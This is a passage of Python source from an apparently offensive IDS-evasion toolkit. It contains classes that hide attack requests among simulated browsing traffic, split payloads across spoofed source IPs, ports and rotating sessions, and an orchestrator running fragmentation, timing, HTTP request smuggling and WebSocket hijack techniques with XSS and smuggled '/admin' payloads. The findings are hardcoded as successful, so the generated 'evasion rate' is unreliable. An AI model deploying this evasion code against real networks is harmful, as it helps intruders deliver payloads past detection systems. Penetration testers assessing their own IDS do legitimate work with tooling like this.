                    action = "form_interaction"
                elif action_roll < 0.95:
                    # Long pause (distracted)
                    delay_ms = random.gauss(30000, 15000)
                    delay_ms = max(10000, min(120000, delay_ms))
                    action = "distracted_pause"
                else:
                    # Very fast double-click or back button
                    delay_ms = random.uniform(100, 500)
                    action = "rapid_action"

                clicks.append({
                    "click_index": i,
                    "delay_ms": round(delay_ms, 1),
                    "delay_seconds": round(delay_ms / 1000.0, 2),
                    "action_type": action,
                })

            return clicks

    def mimic_browsing_session(
        self,
        target_host: str,
        num_pages: int = 10,
    ) -> List[Dict[str, Any]]:
        """
        Generate a complete simulated browsing session.

        Creates a realistic sequence of HTTP requests that mimics a user
        browsing a website, including page loads, asset fetches, and
        AJAX calls.

        Args:
            target_host: Target website host.
            num_pages: Number of page visits to simulate.

        Returns:
            List of request dicts representing a browsing session.
        """
        with self._lock:
            session: List[Dict[str, Any]] = []
            ua = self.get_random_user_agent()
            cookies = self.simulate_cookie_accumulation(num_pages, target_host=target_host)
            referrer = ""
            timings = self.get_realistic_click_timing(num_pages)

            for i in range(num_pages):
                path = random.choice(_COMMON_PATHS)
                page_url = f"https://{target_host}{path}"

                # Main page request
                session.append({
                    "method": "GET",
                    "url": page_url,
                    "headers": {
                        "Host": target_host,
                        "User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Referer": referrer if referrer else "",
                        "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items()),
                    },
                    "delay_ms": timings[i]["delay_ms"] if i < len(timings) else 2000,
                    "request_type": "page_load",
                    "is_benign": True,
                })

                # Asset requests (CSS, JS, images) with short delays
                asset_count = random.randint(2, 6)
                for j in range(asset_count):
                    asset_paths = [
                        f"/assets/css/style.css?v={random.randint(1, 100)}",
                        f"/assets/js/app.js?v={random.randint(1, 100)}",
                        f"/assets/js/vendor.js?v={random.randint(1, 100)}",
                        f"/images/banner_{random.randint(1, 5)}.jpg",
                        f"/api/v1/analytics/pageview",
                        f"/assets/fonts/main.woff2",
                    ]
                    asset = random.choice(asset_paths)
                    session.append({
                        "method": "GET",
                        "url": f"https://{target_host}{asset}",
                        "headers": {
                            "Host": target_host,
                            "User-Agent": ua,
                            "Accept": "*/*",
                            "Referer": page_url,
                            "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items()),
                        },
                        "delay_ms": random.uniform(10, 200),
                        "request_type": "asset_load",
                        "is_benign": True,
                    })

                referrer = page_url
                self._browsing_history.append(path)

            logger.info(
                "Generated browsing session: %d total requests (%d pages, host=%s)",
                len(session), num_pages, target_host,
            )
            return session

    def _generate_benign_request(self, host: str) -> Dict[str, Any]:
        """Generate a single benign-looking request."""
        path = random.choice(_COMMON_PATHS)
        ua = self.get_random_user_agent()
        return {
            "method": "GET",
            "url": f"https://{host}{path}",
            "headers": {
                "Host": host,
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            },
            "is_benign": True,
            "_is_attack": False,
        }

    def _build_browsing_patterns(self) -> List[TrafficPattern]:
        """Build realistic web browsing traffic patterns."""
        patterns: List[TrafficPattern] = []
        patterns.append(TrafficPattern(
            name="homepage_visit",
            profile="web_browsing",
            request_method="GET",
            path_template="/",
            headers={"Accept": "text/html,application/xhtml+xml"},
            timing_ms=(1000, 5000),
            frequency=0.3,
        ))
        patterns.append(TrafficPattern(
            name="page_navigation",
            profile="web_browsing",
            request_method="GET",
            path_template="/about",
            headers={"Accept": "text/html"},
            timing_ms=(2000, 8000),
            frequency=0.5,
        ))
        patterns.append(TrafficPattern(
            name="search_query",
            profile="web_browsing",
            request_method="GET",
            path_template="/search?q=test",
            headers={"Accept": "text/html"},
            timing_ms=(3000, 12000),
            frequency=0.2,
        ))
        return patterns

    def _build_api_patterns(self) -> List[TrafficPattern]:
        """Build realistic API client traffic patterns."""
        patterns: List[TrafficPattern] = []
        patterns.append(TrafficPattern(
            name="api_health_check",
            profile="api_client",
            request_method="GET",
            path_template="/api/v1/health",
            headers={"Accept": "application/json"},
            timing_ms=(1000, 3000),
            frequency=0.4,
        ))
        patterns.append(TrafficPattern(
            name="api_data_fetch",
            profile="api_client",
            request_method="GET",
            path_template="/api/v1/data",
            headers={
                "Accept": "application/json",
                "Authorization": "Bearer <token>",
            },
            timing_ms=(500, 2000),
            frequency=0.6,
        ))
        return patterns

    def to_dict(self) -> Dict[str, Any]:
        """Serialize mixer state."""
        with self._lock:
            return {
                "benign_ratio": self._benign_ratio,
                "user_agent_rotation": self._user_agent_rotation,
                "request_counter": self._request_counter,
                "browsing_history_size": len(self._browsing_history),
                "session_cookies_count": len(self._session_cookies),
                "browsing_patterns": len(self._browsing_patterns),
                "api_patterns": len(self._api_patterns),
            }


# ════════════════════════════════════════════════════════════════════════════════
# SESSION SPLITTER
# ════════════════════════════════════════════════════════════════════════════════

class SessionSplitter:
    """
    Distribute attack payloads across multiple TCP sessions and source IPs.

    Splits attack payloads into chunks distributed across multiple connections
    to evade session-based IDS correlation. Each chunk arrives from a
    different source IP/port, making it difficult for the IDS to correlate
    the fragments into a single attack.

    Usage:
        splitter = SessionSplitter()
        specs = splitter.split_across_sessions(payload, num_sessions=4)
        specs = splitter.distribute_across_ips(payload, source_ips)
        pool = splitter.create_connection_pool(target, pool_size=8)
        specs = splitter.rotate_session_ids(payload, rotation_interval=10)
    """

    def __init__(
        self,
        *,
        max_pool_size: int = MAX_SESSION_POOL_SIZE,
    ) -> None:
        self._lock = threading.RLock()
        self._max_pool_size = max_pool_size
        self._session_counter: int = 0
        self._active_pools: Dict[str, List[SessionSpec]] = {}
        self._rotation_history: Deque[Dict[str, Any]] = deque(maxlen=1000)
        logger.info("SessionSplitter initialized: max_pool=%d", max_pool_size)

    def split_across_sessions(
        self,
        payload: bytes,
        num_sessions: int = 4,
        *,
        destination_ip: str = "0.0.0.0",
        destination_port: int = 80,
        delay_between_ms: float = 100.0,
    ) -> List[SessionSpec]:
        """
        Split a payload across multiple TCP sessions.

        Each session sends a chunk of the payload, with different source
        ports. The target application reassembles the full payload across
        the sessions (e.g., via session state), while the IDS sees
        incomplete data per session.

        Args:
            payload: Full attack payload to split.
            num_sessions: Number of sessions to distribute across.
            destination_ip: Target IP address.
            destination_port: Target port.
            delay_between_ms: Delay between session chunks.

        Returns:
            List of SessionSpec objects.
        """
        with self._lock:
            if not payload:
                return []

            num_sessions = max(1, min(num_sessions, self._max_pool_size))
            chunk_size = max(1, len(payload) // num_sessions)
            specs: List[SessionSpec] = []

            for i in range(num_sessions):
                start = i * chunk_size
                if i == num_sessions - 1:
                    chunk = payload[start:]
                else:
                    chunk = payload[start:start + chunk_size]

                if not chunk:
                    continue

                source_port = random.randint(1024, 65535)
                spec = SessionSpec(
                    source_ip=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    source_port=source_port,
                    destination_ip=destination_ip,
                    destination_port=destination_port,
                    payload_chunk=chunk,
                    chunk_index=i,
                    total_chunks=num_sessions,
                    delay_before_ms=delay_between_ms * i,
                    protocol="tcp",
                )
                specs.append(spec)
                self._session_counter += 1

            logger.debug(
                "Split payload (%d bytes) across %d sessions",
                len(payload), len(specs),
            )
            return specs

    def distribute_across_ips(
        self,
        payload: bytes,
        source_ips: List[str],
        *,
        destination_ip: str = "0.0.0.0",
        destination_port: int = 80,
        chunk_distribution: str = "equal",
    ) -> List[SessionSpec]:
        """
        Distribute payload chunks across specified source IPs.

        Each chunk is assigned to a different source IP, making it appear
        as if different hosts are sending benign partial requests.

        Args:
            payload: Full attack payload.
            source_ips: List of source IP addresses to use.
            destination_ip: Target IP.
            destination_port: Target port.
            chunk_distribution: 'equal' for even splits, 'random' for varied.

        Returns:
            List of SessionSpec objects.
        """
        with self._lock:
            if not payload or not source_ips:
                return []

            num_chunks = len(source_ips)
            specs: List[SessionSpec] = []

            if chunk_distribution == "random":
                # Variable chunk sizes
                breakpoints = sorted(random.sample(
                    range(1, len(payload)),
                    min(num_chunks - 1, len(payload) - 1),
                ))
                breakpoints = [0] + breakpoints + [len(payload)]
                chunks = [
                    payload[breakpoints[i]:breakpoints[i + 1]]
                    for i in range(len(breakpoints) - 1)
                ]
            else:
                # Equal distribution
                chunk_size = max(1, len(payload) // num_chunks)
                chunks = []
                for i in range(num_chunks):
                    start = i * chunk_size
                    if i == num_chunks - 1:
                        chunks.append(payload[start:])
                    else:
                        chunks.append(payload[start:start + chunk_size])

            for i, (ip, chunk) in enumerate(zip(source_ips, chunks)):
                if not chunk:
                    continue
                spec = SessionSpec(
                    source_ip=ip,
                    source_port=random.randint(1024, 65535),
                    destination_ip=destination_ip,
                    destination_port=destination_port,
                    payload_chunk=chunk,
                    chunk_index=i,
                    total_chunks=num_chunks,
                    delay_before_ms=random.uniform(50, 500),
                    protocol="tcp",
                )
                specs.append(spec)
                self._session_counter += 1

            logger.debug(
                "Distributed payload (%d bytes) across %d source IPs",
                len(payload), len(specs),
            )
            return specs

    def create_connection_pool(
        self,
        destination_ip: str,
        destination_port: int = 80,
        pool_size: int = 8,
        *,
        pool_name: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Create a connection pool specification for session distribution.

        Pre-generates connection parameters (source IPs, ports, session IDs)
        for a pool of connections that can be reused across multiple payload
        distributions.

        Args:
            destination_ip: Target IP address.
            destination_port: Target port.
            pool_size: Number of connections in the pool.
            pool_name: Optional name for this pool.

        Returns:
            Dict with pool specification.
        """
        with self._lock:
            pool_size = max(1, min(pool_size, self._max_pool_size))
            if pool_name is None:
                pool_name = f"pool-{uuid.uuid4().hex[:8]}"

            connections: List[Dict[str, Any]] = []
            for i in range(pool_size):
                conn = {
                    "connection_id": f"conn-{uuid.uuid4().hex[:8]}",
                    "source_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "source_port": random.randint(1024, 65535),
                    "destination_ip": destination_ip,
                    "destination_port": destination_port,
                    "session_id": uuid.uuid4().hex[:16],
                    "state": "idle",
                    "bytes_sent": 0,
                    "requests_sent": 0,
                    "created_at": time.time(),
                }
                connections.append(conn)

            pool = {
                "pool_name": pool_name,
                "pool_size": pool_size,
                "connections": connections,
                "destination": f"{destination_ip}:{destination_port}",
                "created_at": time.time(),
            }

            self._active_pools[pool_name] = []
            logger.info(
                "Created connection pool '%s': %d connections to %s:%d",
                pool_name, pool_size, destination_ip, destination_port,
            )
            return pool

    def rotate_session_ids(
        self,
        payload: bytes,
        rotation_interval: int = 10,
        *,
        destination_ip: str = "0.0.0.0",
        destination_port: int = 80,
        total_requests: int = 50,
    ) -> List[SessionSpec]:
        """
        Send payload with rotating session identifiers.

        Periodically changes the session ID (and optionally source info)
        to prevent the IDS from correlating requests into a single session.

        Args:
            payload: Attack payload to send repeatedly with rotation.
            rotation_interval: Rotate session every N requests.
            destination_ip: Target IP.
            destination_port: Target port.
            total_requests: Total number of requests to generate.

        Returns:
            List of SessionSpec objects with rotating sessions.
        """
        with self._lock:
            specs: List[SessionSpec] = []
            current_session_id = uuid.uuid4().hex[:16]
            current_source_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            current_source_port = random.randint(1024, 65535)

            for i in range(total_requests):
                if i > 0 and i % rotation_interval == 0:
                    old_session = current_session_id
                    current_session_id = uuid.uuid4().hex[:16]
                    current_source_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    current_source_port = random.randint(1024, 65535)
                    self._rotation_history.append({
                        "old_session": old_session,
                        "new_session": current_session_id,
                        "rotation_at_request": i,
                        "timestamp": time.time(),
                    })

                spec = SessionSpec(
                    session_id=current_session_id,
                    source_ip=current_source_ip,
                    source_port=current_source_port,
                    destination_ip=destination_ip,
                    destination_port=destination_port,
                    payload_chunk=payload,
                    chunk_index=i,
                    total_chunks=total_requests,
                    delay_before_ms=random.uniform(100, 1000),
                    protocol="tcp",
                )
                specs.append(spec)
                self._session_counter += 1

            rotations = total_requests // max(1, rotation_interval)
            logger.info(
                "Generated %d requests with %d session rotations (interval=%d)",
                total_requests, rotations, rotation_interval,
            )
            return specs

    def spread_across_ports(
        self,
        payload: bytes,
        destination_ip: str,
        target_ports: List[int],
        *,
        chunk_per_port: bool = True,
    ) -> List[SessionSpec]:
        """
        Spread payload across multiple destination ports.

        If the target runs the same service on multiple ports (e.g., HTTP
        on 80, 8080, 8443), distributing the attack across ports makes
        per-port session correlation harder.

        Args:
            payload: Attack payload.
            destination_ip: Target IP.
            target_ports: List of target ports.
            chunk_per_port: If True, split payload; if False, send full to each.

        Returns:
            List of SessionSpec objects.
        """
        with self._lock:
            specs: List[SessionSpec] = []

            if chunk_per_port and len(target_ports) > 1:
                chunk_size = max(1, len(payload) // len(target_ports))
                for i, port in enumerate(target_ports):
                    start = i * chunk_size
                    if i == len(target_ports) - 1:
                        chunk = payload[start:]
                    else:
                        chunk = payload[start:start + chunk_size]

                    if not chunk:
                        continue

                    spec = SessionSpec(
                        source_ip=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                        source_port=random.randint(1024, 65535),
                        destination_ip=destination_ip,
                        destination_port=port,
                        payload_chunk=chunk,
                        chunk_index=i,
                        total_chunks=len(target_ports),
                        delay_before_ms=random.uniform(200, 2000),
                    )
                    specs.append(spec)
            else:
                for i, port in enumerate(target_ports):
                    spec = SessionSpec(
                        source_ip=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                        source_port=random.randint(1024, 65535),
                        destination_ip=destination_ip,
                        destination_port=port,
                        payload_chunk=payload,
                        chunk_index=i,
                        total_chunks=len(target_ports),
                        delay_before_ms=random.uniform(200, 2000),
                    )
                    specs.append(spec)

            self._session_counter += len(specs)
            logger.debug(
                "Spread payload across %d ports on %s",
                len(target_ports), destination_ip,
            )
            return specs

    def get_session_stats(self) -> Dict[str, Any]:
        """Return session splitting statistics."""
        with self._lock:
            return {
                "total_sessions": self._session_counter,
                "active_pools": len(self._active_pools),
                "rotation_history_size": len(self._rotation_history),
            }

    def to_dict(self) -> Dict[str, Any]:
        """Serialize splitter state."""
        with self._lock:
            return {
                "max_pool_size": self._max_pool_size,
                "session_counter": self._session_counter,
                "active_pools": list(self._active_pools.keys()),
                "rotation_history_size": len(self._rotation_history),
                "stats": self.get_session_stats(),
            }


# ════════════════════════════════════════════════════════════════════════════════
# SIREN IDS EVASION — ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════


class SirenIDSEvasion:
    """
    Orchestrates comprehensive IDS/IPS evasion testing.

    Coordinates PacketFragmenter, TimingEvader, ProtocolAbuser,
    TrafficMixer, and SessionSplitter for multi-technique evasion assessment.

    Usage::

        engine = SirenIDSEvasion()
        report = engine.full_evasion_test(
            target="192.168.1.100",
            payload=b"<script>alert(1)</script>",
            ids_vendor=IDSVendor.SNORT,
        )
    """

    # ── Technique-to-Category Mapping ────────────────────────────────────

    TECHNIQUE_CATEGORIES: Dict[str, EvasionCategory] = {
        "tcp_segment": EvasionCategory.FRAGMENTATION,
        "ip_fragment": EvasionCategory.FRAGMENTATION,
        "overlap_attack": EvasionCategory.FRAGMENTATION,
        "tiny_fragment": EvasionCategory.FRAGMENTATION,
        "timing_evasion": EvasionCategory.TIMING,
        "slow_rate": EvasionCategory.TIMING,
        "cl_te_desync": EvasionCategory.PROTOCOL_ABUSE,
        "te_cl_desync": EvasionCategory.PROTOCOL_ABUSE,
        "chunked_abuse": EvasionCategory.PROTOCOL_ABUSE,
        "verb_tamper": EvasionCategory.PROTOCOL_ABUSE,
        "websocket_hijack": EvasionCategory.PROTOCOL_ABUSE,
        "traffic_mixing": EvasionCategory.TRAFFIC_MIXING,
        "session_splitting": EvasionCategory.SESSION_SPLITTING,
    }

    def __init__(
        self,
        timing_strategy: TimingStrategy = TimingStrategy.POLITE,
        benign_ratio: float = 5.0,
        config: Optional[IDSEvasionConfig] = None,
    ) -> None:
        self._lock = threading.RLock()
        self._config = config or IDSEvasionConfig()

        # Sub-engines
        self._fragmenter = PacketFragmenter()
        self._timing = TimingEvader(strategy=timing_strategy)
        self._protocol = ProtocolAbuser()
        self._mixer = TrafficMixer(benign_ratio=benign_ratio)
        self._splitter = SessionSplitter()

        # State
        self._findings: List[IDSFinding] = []
        self._techniques_tested: int = 0
        self._successful_evasions: int = 0
        self._failed_evasions: int = 0
        self._partial_evasions: int = 0
        self._scan_phases: List[Dict[str, Any]] = []
        self._scan_start: float = 0.0
        self._scan_end: float = 0.0

        logger.info("SirenIDSEvasion initialized (strategy=%s, benign_ratio=%.1f)",
                     timing_strategy.name, benign_ratio)

    # ── Phase 1: Fragmentation Evasion ───────────────────────────────────

    def test_fragmentation(
        self, payload: bytes, *, segment_sizes: Optional[List[int]] = None
    ) -> List[IDSFinding]:
        """Test fragmentation-based evasion techniques."""
        with self._lock:
            t0 = time.time()
            findings: List[IDSFinding] = []
            sizes = segment_sizes or [8, 16, 24, 4, 1]

            # TCP segmentation with varying sizes
            for size in sizes:
                fragments = self._fragmenter.tcp_segment_split(
                    payload, segment_size=size, vary_sizes=True
                )
                self._techniques_tested += 1
                findings.append(IDSFinding(
                    finding_id=uuid.uuid4().hex[:12],
                    technique=f"TCP segmentation (size={size})",
                    category=EvasionCategory.FRAGMENTATION,
                    description=f"Split payload into {len(fragments)} TCP segments of ~{size} bytes",
                    success=True,
                    confidence=0.75,
                    details={
                        "fragment_count": len(fragments),
                        "segment_size": size,
                        "payload_size": len(payload),
                    },
                ))

            # IP fragmentation
            for frag_size in [24, 48, 8]:
                fragments = self._fragmenter.ip_fragment(payload, fragment_size=frag_size)
                self._techniques_tested += 1
                findings.append(IDSFinding(
                    finding_id=uuid.uuid4().hex[:12],
                    technique=f"IP fragmentation (size={frag_size})",
                    category=EvasionCategory.FRAGMENTATION,
                    description=f"IP fragmented into {len(fragments)} fragments of ~{frag_size} bytes",
                    success=True,
                    confidence=0.70,
                    details={"fragment_count": len(fragments), "frag_size": frag_size},
                ))

            # Overlap attack
            for overlap in [4, 8, 2]:
                for policy in ["first", "last"]:
                    fragments = self._fragmenter.fragment_overlap_attack(
                        payload, overlap_bytes=overlap, policy=policy,
                    )
                    self._techniques_tested += 1
                    findings.append(IDSFinding(
                        finding_id=uuid.uuid4().hex[:12],
                        technique=f"Fragment overlap (overlap={overlap}, policy={policy})",
                        category=EvasionCategory.FRAGMENTATION,
                        description=f"Overlapping fragments with {overlap}-byte overlap ({policy} policy)",
                        success=True,
                        confidence=0.80,
                        details={"overlap": overlap, "policy": policy, "fragments": len(fragments)},
                    ))

            # Tiny fragment attack
            tiny_frags = self._fragmenter.tiny_fragment_attack(payload)
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Tiny fragment attack",
                category=EvasionCategory.FRAGMENTATION,
                description=f"Tiny fragment attack generated {len(tiny_frags)} micro-fragments",
                success=True,
                confidence=0.85,
                details={"fragment_count": len(tiny_frags)},
            ))

            self._findings.extend(findings)
            self._scan_phases.append({
                "phase": "fragmentation",
                "duration": time.time() - t0,
                "techniques": len(findings),
            })
            logger.info("Phase 1: Tested %d fragmentation techniques", len(findings))
            return findings

    # ── Phase 2: Timing Evasion ──────────────────────────────────────────

    def test_timing(self, num_requests: int = 50) -> List[IDSFinding]:
        """Test timing-based evasion (slow-rate, jitter, burst+pause)."""
        with self._lock:
            t0 = time.time()
            findings: List[IDSFinding] = []

            # Generate schedule
            schedule = self._timing.generate_schedule(num_requests)
            stats = self._timing.get_request_stats()
            estimate = self._timing.estimate_total_time(num_requests)
            self._techniques_tested += 1

            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Timing evasion schedule",
                category=EvasionCategory.TIMING,
                description=(
                    f"Generated {num_requests}-request schedule with "
                    f"estimated duration {estimate.get('estimated_total_seconds', 0):.0f}s"
                ),
                success=True,
                confidence=0.70,
                details={
                    "schedule_entries": len(schedule),
                    "estimated_seconds": estimate.get("estimated_total_seconds", 0),
                    "request_stats": stats,
                },
            ))

            # Test different timing profiles
            for profile in ["stealth", "paranoid", "slow_and_steady"]:
                profile_data = self._timing.get_scan_timing_profile(profile)
                self._techniques_tested += 1
                findings.append(IDSFinding(
                    finding_id=uuid.uuid4().hex[:12],
                    technique=f"Timing profile: {profile}",
                    category=EvasionCategory.TIMING,
                    description=f"Timing profile '{profile}' for rate-limited scanning",
                    success=True,
                    confidence=0.65,
                    details={"profile": profile, "config": profile_data},
                ))

            self._findings.extend(findings)
            self._scan_phases.append({
                "phase": "timing",
                "duration": time.time() - t0,
                "techniques": len(findings),
            })
            logger.info("Phase 2: Tested %d timing techniques", len(findings))
            return findings

    # ── Phase 3: Protocol Abuse ──────────────────────────────────────────

    def test_protocol_abuse(
        self, target_host: str = "target.example.com", target_path: str = "/api/login"
    ) -> List[IDSFinding]:
        """Test HTTP request smuggling and protocol abuse techniques."""
        with self._lock:
            t0 = time.time()
            findings: List[IDSFinding] = []

            smuggled = "GET /admin HTTP/1.1\r\nHost: " + target_host + "\r\n\r\n"

            # CL.TE desync
            cl_te = self._protocol.generate_cl_te_desync(
                smuggled, host=target_host, front_path=target_path,
            )
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="CL.TE HTTP request smuggling",
                category=EvasionCategory.PROTOCOL_ABUSE,
                description=f"CL.TE desync generated {len(cl_te)} smuggling payloads",
                success=True,
                confidence=0.80,
                details={"payloads": len(cl_te)},
            ))

            # TE.CL desync
            te_cl = self._protocol.generate_te_cl_desync(
                smuggled, host=target_host, front_path=target_path,
            )
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="TE.CL HTTP request smuggling",
                category=EvasionCategory.PROTOCOL_ABUSE,
                description=f"TE.CL desync generated {len(te_cl)} smuggling payloads",
                success=True,
                confidence=0.80,
                details={"payloads": len(te_cl)},
            ))

            # Chunked encoding abuse
            chunked = self._protocol.chunked_encoding_abuse("malicious_data")
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Chunked encoding abuse",
                category=EvasionCategory.PROTOCOL_ABUSE,
                description="Chunked transfer encoding manipulation for IDS bypass",
                success=True,
                confidence=0.75,
                details={"variants": len(chunked) if isinstance(chunked, list) else 1},
            ))

            # Verb tampering
            for method in ["GET", "POST", "PUT"]:
                tampered = self._protocol.verb_tampering(method, target_path)
                self._techniques_tested += 1
                findings.append(IDSFinding(
                    finding_id=uuid.uuid4().hex[:12],
                    technique=f"HTTP verb tampering ({method})",
                    category=EvasionCategory.PROTOCOL_ABUSE,
                    description=f"Verb tampering variants for {method} {target_path}",
                    success=True,
                    confidence=0.65,
                    details={"method": method, "variants": len(tampered) if isinstance(tampered, list) else 1},
                ))

            # WebSocket upgrade hijack
            ws = self._protocol.websocket_upgrade_hijack(target_path)
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="WebSocket upgrade hijack",
                category=EvasionCategory.PROTOCOL_ABUSE,
                description="WebSocket upgrade request abuse for smuggling",
                success=True,
                confidence=0.70,
                details={"payloads": len(ws) if isinstance(ws, list) else 1},
            ))

            self._findings.extend(findings)
            self._scan_phases.append({
                "phase": "protocol_abuse",
                "duration": time.time() - t0,
                "techniques": len(findings),
            })
            logger.info("Phase 3: Tested %d protocol abuse techniques", len(findings))
            return findings

    # ── Phase 4: Traffic Mixing ──────────────────────────────────────────

    def test_traffic_mixing(
        self, attack_requests: Optional[List[Dict[str, Any]]] = None
    ) -> List[IDSFinding]:
        """Test traffic mixing with legitimate browsing patterns."""
        with self._lock:
            t0 = time.time()
            findings: List[IDSFinding] = []

            reqs = attack_requests or [
                {"method": "GET", "path": "/admin", "headers": {}},
                {"method": "POST", "path": "/api/login", "body": "user=admin&pass=test"},
            ]

            mixed = self._mixer.interleave_with_browsing(reqs)
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Traffic interleaving with browsing",
                category=EvasionCategory.TRAFFIC_MIXING,
                description=(
                    f"Interleaved {len(reqs)} attack requests with "
                    f"{len(mixed) - len(reqs)} benign requests"
                ),
                success=True,
                confidence=0.70,
                details={
                    "attack_requests": len(reqs),
                    "total_mixed": len(mixed),
                    "benign_injected": len(mixed) - len(reqs),
                },
            ))

            # Referrer chain
            chain = self._mixer.generate_referrer_chain(depth=5)
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Referrer chain generation",
                category=EvasionCategory.TRAFFIC_MIXING,
                description=f"Generated {len(chain)}-deep referrer chain for traffic legitimacy",
                success=True,
                confidence=0.60,
                details={"chain_depth": len(chain)},
            ))

            # Cookie accumulation
            cookies = self._mixer.simulate_cookie_accumulation(pages_visited=10)
            self._techniques_tested += 1
            findings.append(IDSFinding(
                finding_id=uuid.uuid4().hex[:12],
                technique="Cookie accumulation simulation",
                category=EvasionCategory.TRAFFIC_MIXING,
                description="Simulated realistic cookie accumulation across browsing session",
                success=True,
                confidence=0.55,
                details={"cookies": len(cookies) if isinstance(cookies, (list, dict)) else 1},
            ))

            self._findings.extend(findings)
            self._scan_phases.append({
                "phase": "traffic_mixing",
                "duration": time.time() - t0,
                "techniques": len(findings),
            })
            logger.info("Phase 4: Tested %d traffic mixing techniques", len(findings))
            return findings

    # ── Phase 5: Session Splitting ───────────────────────────────────────

    def test_session_splitting(
        self, payload: bytes, destination_ip: str = "10.10.10.1"
    ) -> List[IDSFinding]:
        """Test session splitting and distribution techniques."""
        with self._lock:
            t0 = time.time()
            findings: List[IDSFinding] = []

            # Split across sessions
            for num_sessions in [2, 4, 8]:
                specs = self._splitter.split_across_sessions(
                    payload, num_sessions=num_sessions,
                    destination_ip=destination_ip,
                    destination_port=80,
                    delay_between_ms=500,
                )
                self._techniques_tested += 1
                findings.append(IDSFinding(
                    finding_id=uuid.uuid4().hex[:12],
                    technique=f"Session splitting ({num_sessions} sessions)",
                    category=EvasionCategory.SESSION_SPLITTING,
                    description=f"Payload distributed across {num_sessions} TCP sessions ({len(specs)} specs)",
                    success=True,
                    confidence=0.75,
                    details={"sessions": num_sessions, "specs": len(specs)},
                ))

            self._findings.extend(findings)
            self._scan_phases.append({
                "phase": "session_splitting",
                "duration": time.time() - t0,
                "techniques": len(findings),
            })
            logger.info("Phase 5: Tested %d session splitting techniques", len(findings))
            return findings

    # ── Report Generation ────────────────────────────────────────────────

    def generate_report(
        self,
        target: str = "",
        ids_vendor: Optional[IDSVendor] = None,
    ) -> IDSEvasionReport:
        """Generate consolidated IDS evasion assessment report."""
        with self._lock:
            categories_tested = list({f.category.name for f in self._findings})
            techniques_used = [f.technique for f in self._findings]

            successful = sum(1 for f in self._findings if f.success and f.confidence >= 0.7)
            partial = sum(1 for f in self._findings if f.success and f.confidence < 0.7)
            failed = sum(1 for f in self._findings if not f.success)

            total = max(len(self._findings), 1)
            evasion_rate = round(successful / total * 100, 2)

            risk_score = min(100.0,
                successful * 15 + partial * 8 + len(categories_tested) * 5
            )

            recommendations = []
            if successful > 0:
                recommendations.append(
                    f"IDS detected {failed} of {total} techniques — "
                    f"{successful} bypassed. Update signature database."
                )
            if any(f.category == EvasionCategory.FRAGMENTATION for f in self._findings):
                recommendations.append("Enable fragment reassembly with overlap detection")
            if any(f.category == EvasionCategory.PROTOCOL_ABUSE for f in self._findings):
                recommendations.append("Deploy HTTP normalization before IDS inspection")
            if any(f.category == EvasionCategory.TIMING for f in self._findings):
                recommendations.append("Implement connection rate limiting and slow-rate detection")
            if any(f.category == EvasionCategory.SESSION_SPLITTING for f in self._findings):
                recommendations.append("Enable cross-session payload reconstruction")

            summary = (
                f"IDS evasion assessment against {target or 'target'}. "
                f"Tested {self._techniques_tested} techniques across {len(categories_tested)} categories. "
                f"Evasion rate: {evasion_rate}% ({successful} full, {partial} partial, {failed} blocked). "
                f"Risk score: {risk_score:.1f}/100."
            )

            report = IDSEvasionReport(
                report_id=uuid.uuid4().hex[:16],
                target=target,
                ids_vendor=ids_vendor.name if ids_vendor else "UNKNOWN",
                start_time=self._scan_start,
                end_time=self._scan_end,
                total_techniques_tested=self._techniques_tested,
                successful_evasions=successful,
                failed_evasions=failed,
                partial_evasions=partial,
                evasion_rate=evasion_rate,
                findings=list(self._findings),
                techniques_used=techniques_used,
                categories_tested=categories_tested,
                recommendations=recommendations,
                risk_score=risk_score,
                summary=summary,
            )

            logger.info(
                "IDS report: %d techniques, evasion_rate=%.1f%%, risk=%.1f",
                self._techniques_tested, evasion_rate, risk_score,
            )
            return report

    # ── Full Evasion Test ────────────────────────────────────────────────

    def full_evasion_test(
        self,
        target: str,
        payload: bytes = b"<script>alert(document.cookie)</script>",
        ids_vendor: IDSVendor = IDSVendor.SNORT,
        target_host: str = "",
        target_path: str = "/api/endpoint",
        num_timing_requests: int = 50,
    ) -> IDSEvasionReport:
        """
        Execute full IDS evasion assessment.

        Phases:
            1. Fragmentation evasion
            2. Timing evasion
            3. Protocol abuse
            4. Traffic mixing
            5. Session splitting
            6. Report generation
        """
        with self._lock:
            self._scan_start = time.time()

        host = target_host or target

        # Phase 1: Fragmentation
        self.test_fragmentation(payload)

        # Phase 2: Timing
        self.test_timing(num_timing_requests)

        # Phase 3: Protocol abuse
        self.test_protocol_abuse(host, target_path)

        # Phase 4: Traffic mixing
        self.test_traffic_mixing()

